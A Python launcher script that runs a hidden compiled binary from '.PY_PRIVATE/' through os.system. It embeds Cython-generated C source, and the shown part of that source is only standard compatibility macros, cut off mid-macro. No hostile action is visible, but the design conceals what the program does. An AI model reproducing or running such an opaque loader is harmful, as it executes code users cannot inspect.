
import os
import sys

PSH_TEAM_KEY = "بخ 👀"

EXECUTE_FILE = ".PY_PRIVATE/20250430174226570"
PREFIX = sys.prefix
EXPORT_PYTHONHOME = 'export PYTHONHOME='+PREFIX
EXPORT_PYTHON_EXECUTABLE = 'export PYTHON_EXECUTABLE='+sys.executable

RUN = "./"+EXECUTE_FILE

if os.path.isfile(EXECUTE_FILE):
    os.system(EXPORT_PYTHONHOME+" && "+EXPORT_PYTHON_EXECUTABLE+" && "+RUN)
    exit(0)

C_SOURCE = r'''#ifndef PY_SSIZE_T_CLEAN
#define PY_SSIZE_T_CLEAN
#endif /* PY_SSIZE_T_CLEAN */
#include "Python.h"
#ifndef Py_PYTHON_H
    #error Python headers needed to compile C extensions, please install development version of Python.
#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)
    #error Cython requires Python 2.6+ or Python 3.3+.
#else
#define CYTHON_ABI "0_29_33"
#define CYTHON_HEX_VERSION 0x001D21F0
#define CYTHON_FUTURE_DIVISION 1
#include <stddef.h>
#ifndef offsetof
  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )
#endif
#if !defined(WIN32) && !defined(MS_WINDOWS)
  #ifndef __stdcall
    #define __stdcall
  #endif
  #ifndef __cdecl
    #define __cdecl
  #endif
  #ifndef __fastcall
    #define __fastcall
  #endif
#endif
#ifndef DL_IMPORT
  #define DL_IMPORT(t) t
#endif
#ifndef DL_EXPORT
  #define DL_EXPORT(t) t
#endif
#define __PYX_COMMA ,
#ifndef HAVE_LONG_LONG
  #if PY_VERSION_HEX >= 0x02070000
    #define HAVE_LONG_LONG
  #endif
#endif
#ifndef PY_LONG_LONG
  #define PY_LONG_LONG LONG_LONG
#endif
#ifndef Py_HUGE_VAL
  #define Py_HUGE_VAL HUGE_VAL
#endif
#ifdef PYPY_VERSION
  #define CYTHON_COMPILING_IN_PYPY 1
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PYSTON_VERSION)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 1
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #undef CYTHON_USE_ASYNC_SLOTS
  #define CYTHON_USE_ASYNC_SLOTS 0
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PY_NOGIL)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 1
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #ifndef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE 1
  #endif
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#else
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 1
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYTYPE_LOOKUP
    #define CYTHON_USE_PYTYPE_LOOKUP 0
  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)
    #define CYTHON_USE_PYTYPE_LOOKUP 1
  #endif
  #if PY_MAJOR_VERSION < 3
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYLONG_INTERNALS
    #define CYTHON_USE_PYLONG_INTERNALS 0
  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)
    #define CYTHON_USE_PYLONG_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_PYLIST_INTERNALS
    #define CYTHON_USE_PYLIST_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2
    #undef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #elif !defined(CYTHON_USE_UNICODE_WRITER)
    #define CYTHON_USE_UNICODE_WRITER 1
  #endif
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_FAST_THREAD_STATE
    #define CYTHON_FAST_THREAD_STATE 0
  #elif !defined(CYTHON_FAST_THREAD_STATE)
    #define CYTHON_FAST_THREAD_STATE 1
  #endif
  #ifndef CYTHON_FAST_PYCALL
    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030A0000)
  #endif
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)
  #endif
  #ifndef CYTHON_USE_DICT_VERSIONS
    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_USE_EXC_INFO_STACK
    #define CYTHON_USE_EXC_INFO_STACK 0
  #elif !defined(CYTHON_USE_EXC_INFO_STACK)
    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)
  #endif
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1
  #endif
#endif
#if !defined(CYTHON_FAST_PYCCALL)
#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)
#endif
#if CYTHON_USE_PYLONG_INTERNALS
  #if PY_MAJOR_VERSION < 3
    #include "longintrepr.h"
  #endif
  #undef SHIFT
  #undef BASE
  #undef MASK
  #ifdef SIZEOF_VOID_P
    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };
  #endif
#endif
#ifndef __has_attribute
  #define __has_attribute(x) 0
#endif
#ifndef __has_cpp_attribute
  #define __has_cpp_attribute(x) 0
#endif
#ifndef CYTHON_RESTRICT
  #if defined(__GNUC__)
    #define CYTHON_RESTRICT __restrict__
  #elif defined(_MSC_VER) && _MSC_VER >= 1400
    #define CYTHON_RESTRICT __restrict
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_RESTRICT restrict
  #else
    #define CYTHON_RESTRICT
  #endif
#endif
#ifndef CYTHON_UNUSED
# if defined(__GNUC__)
#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))
#     define CYTHON_UNUSED __attribute__ ((__unused__))
#   else
#     define CYTHON_UNUSED
#   endif
# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))
#   define CYTHON_UNUSED __attribute__ ((__unused__))
# else
#   define CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_MAYBE_UNUSED_VAR
#  if defined(__cplusplus)
     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }
#  else
#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)
#  endif
#endif
#ifndef CYTHON_NCP_UNUSED
# if CYTHON_COMPILING_IN_CPYTHON
#  define CYTHON_NCP_UNUSED
# else
#  define CYTHON_NCP_UNUSED CYTHON_UNUSED
# endif
#endif
#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)
#ifdef _MSC_VER
    #ifndef _MSC_STDINT_H_
        #if _MSC_VER < 1300
           typedef unsigned char     uint8_t;
           typedef unsigned int      uint32_t;
        #else
           typedef unsigned __int8   uint8_t;
           typedef unsigned __int32  uint32_t;
        #endif
    #endif
#else
   #include <stdint.h>
#endif
#ifndef CYTHON_FALLTHROUGH
  #if defined(__cplusplus) && __cplusplus >= 201103L
    #if __has_cpp_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH [[fallthrough]]
    #elif __has_cpp_attribute(clang::fallthrough)
      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]
    #elif __has_cpp_attribute(gnu::fallthrough)
      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]
    #endif
  #endif
  #ifndef CYTHON_FALLTHROUGH
    #if __has_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))
    #else
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
  #if defined(__clang__ ) && defined(__apple_build_version__)
    #if __apple_build_version__ < 7000000
      #undef  CYTHON_FALLTHROUGH
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
#endif

#ifndef CYTHON_INLINE
  #if defined(__clang__)
    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))
  #elif defined(__GNUC__)
    #define CYTHON_INLINE __inline__
  #elif defined(_MSC_VER)
    #define CYTHON_INLINE __inline
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_INLINE inline
  #else
    #define CYTHON_INLINE
  #endif
#endif

#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)
  #define Py_OptimizeFlag 0
#endif
#define __PYX_BUILD_PY_SSIZE_T "n"
#define CYTHON_FORMAT_SSIZE_T "z"
#if PY_MAJOR_VERSION < 3
  #define __Pyx_BUILTIN_MODULE_NAME "__builtin__"
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
  #define __Pyx_DefaultClassType PyClass_Type
#else
  #define __Pyx_BUILTIN_MODULE_NAME "builtins"
  #define __Pyx_DefaultClassType PyType_Type
#if PY_VERSION_HEX >= 0x030B00A1
    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,
                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,
                                                    PyObject *fv, PyObject *cell, PyObject* fn,
                                                    PyObject *name, int fline, PyObject *lnos) {
        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;
        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_result=NULL, *empty=NULL;
        const char *fn_cstr=NULL;
        const char *name_cstr=NULL;
        PyCodeObject* co=NULL;
        PyObject *type, *value, *traceback;
        PyErr_Fetch(&type, &value, &traceback);
        if (!(kwds=PyDict_New())) goto end;
        if (!(argcount=PyLong_FromLong(a))) goto end;
        if (PyDict_SetItemString(kwds, "co_argcount", argcount) != 0) goto end;
        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;
        if (PyDict_SetItemString(kwds, "co_posonlyargcount", posonlyargcount) != 0) goto end;
        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;
        if (PyDict_SetItemString(kwds, "co_kwonlyargcount", kwonlyargcount) != 0) goto end;
        if (!(nlocals=PyLong_FromLong(l))) goto end;
        if (PyDict_SetItemString(kwds, "co_nlocals", nlocals) != 0) goto end;
        if (!(stacksize=PyLong_FromLong(s))) goto end;
        if (PyDict_SetItemString(kwds, "co_stacksize", stacksize) != 0) goto end;
        if (!(flags=PyLong_FromLong(f))) goto end;
        if (PyDict_SetItemString(kwds, "co_flags", flags) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_code", code) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_consts", c) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_names", n) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_varnames", v) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_freevars", fv) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_cellvars", cell) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_linetable", lnos) != 0) goto end;
        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;
        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;
        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;
        if (!(replace = PyObject_GetAttrString((PyObject*)co, "replace"))) goto cleanup_code_too;
        if (!(empty = PyTuple_New(0))) goto cleanup_code_too; // unfortunately __pyx_empty_tuple isn't available here
        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;
        Py_XDECREF((PyObject*)co);
        co = (PyCodeObject*)call_result;
        call_result = NULL;
        if (0) {
            cleanup_code_too:
            Py_XDECREF((PyObject*)co);
            co = NULL;
        }
        end:
        Py_XDECREF(kwds);
        Py_XDECREF(argcount);
        Py_XDECREF(posonlyargcount);
        Py_XDECREF(kwonlyargcount);
        Py_XDECREF(nlocals);
        Py_XDECREF(stacksize);
        Py_XDECREF(replace);
        Py_XDECREF(call_result);
        Py_XDECREF(empty);
        if (type) {
            PyErr_Restore(type, value, traceback);
        }
        return co;
    }
#else
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#endif
  #define __Pyx_DefaultClassType PyType_Type
#endif
#ifndef Py_TPFLAGS_CHECKTYPES
  #define Py_TPFLAGS_CHECKTYPES 0
#endif
#ifndef Py_TPFLAGS_HAVE_INDEX
  #define Py_TPFLAGS_HAVE_INDEX 0
#endif
#ifndef Py_TPFLAGS_HAVE_NEWBUFFER
  #define Py_TPFLAGS_HAVE_NEWBUFFER 0
#endif
#ifndef Py_TPFLAGS_HAVE_FINALIZE
  #define Py_TPFLAGS_HAVE_FINALIZE 0
#endif
#ifndef METH_STACKLESS
  #define METH_STACKLESS 0
#endif
#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)
  #ifndef METH_FASTCALL
     #define METH_FASTCALL 0x80
  #endif
  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);
  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,
                                                          Py_ssize_t nargs, PyObject *kwnames);
#else
  #define __Pyx_PyCFunctionFast _PyCFunctionFast
  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords
#endif
#if CYTHON_FAST_PYCCALL
#define __Pyx_PyFastCFunction_Check(func)\
    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))
#else
#define __Pyx_PyFastCFunction_Check(func) 0
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)
  #define PyObject_Malloc(s)   PyMem_Malloc(s)
  #define PyObject_Free(p)     PyMem_Free(p)
  #define PyObject_Realloc(p)  PyMem_Realloc(p)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1
  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)
  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)
  #define PyMem_RawFree(p)             PyMem_Free(p)
#endif
#if CYTHON_COMPILING_IN_PYSTON
  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)
#else
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)
#endif
#if !CYTHON_FAST_THREAD_STATE || PY_VERSION_HEX < 0x02070000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#elif PY_VERSION_HEX >= 0x03060000
  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()
#elif PY_VERSION_HEX >= 0x03000000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#else
  #define __Pyx_PyThreadState_Current _PyThreadState_Current
#endif
#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)
#include "pythread.h"
#define Py_tss_NEEDS_INIT 0
typedef int Py_tss_t;
static CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {
  *key = PyThread_create_key();
  return 0;
}
static CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {
  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));
  *key = Py_tss_NEEDS_INIT;
  return key;
}
static CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {
  PyObject_Free(key);
}
static CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {
  return *key != Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {
  PyThread_delete_key(*key);
  *key = Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {
  return PyThread_set_key_value(*key, value);
}
static CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {
  return PyThread_get_key_value(*key);
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)
#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))
#else
#define __Pyx_PyDict_NewPresized(n)  PyDict_New()
#endif
#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)
#else
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS
#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)
#else
#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)
#endif
#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)
  #define CYTHON_PEP393_ENABLED 1
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_READY(op)       (0)
  #else
    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\
                                                0 : _PyUnicode_Ready((PyObject *)(op)))
  #endif
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)
  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)
  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)
  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))
  #else
    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))
    #else
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))
    #endif
  #endif
#else
  #define CYTHON_PEP393_ENABLED 0
  #define PyUnicode_1BYTE_KIND  1
  #define PyUnicode_2BYTE_KIND  2
  #define PyUnicode_4BYTE_KIND  4
  #define __Pyx_PyUnicode_READY(op)       (0)
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)
  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))
  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))
  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))
#endif
#if CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)
#else
  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)
  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)
  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)
  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)
#endif
#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))
#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)
#else
  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)
#endif
#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)
  #define PyObject_ASCII(o)            PyObject_Repr(o)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBaseString_Type            PyUnicode_Type
  #define PyStringObject               PyUnicodeObject
  #define PyString_Type                PyUnicode_Type
  #define PyString_Check               PyUnicode_Check
  #define PyString_CheckExact          PyUnicode_CheckExact
#ifndef PyObject_Unicode
  #define PyObject_Unicode             PyObject_Str
#endif
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)
  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)
#else
  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))
  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))
#endif
#ifndef PySet_CheckExact
  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)
#endif
#if PY_VERSION_HEX >= 0x030900A4
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)
#else
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)
